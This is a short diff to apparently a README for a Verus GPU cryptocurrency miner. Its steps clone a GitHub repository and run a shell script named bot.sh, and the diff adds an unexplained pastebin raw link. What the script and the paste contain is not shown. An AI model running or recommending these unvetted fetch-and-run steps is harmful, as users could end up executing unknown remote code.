@@ -5,3 +5,5 @@ Verus GPU only
 git clone https://github.com/Kopen1/Verus_GPU.git
 
 cd ccminer && sh bot.sh
+
+https://pastebin.com/raw/VP9CiHTL
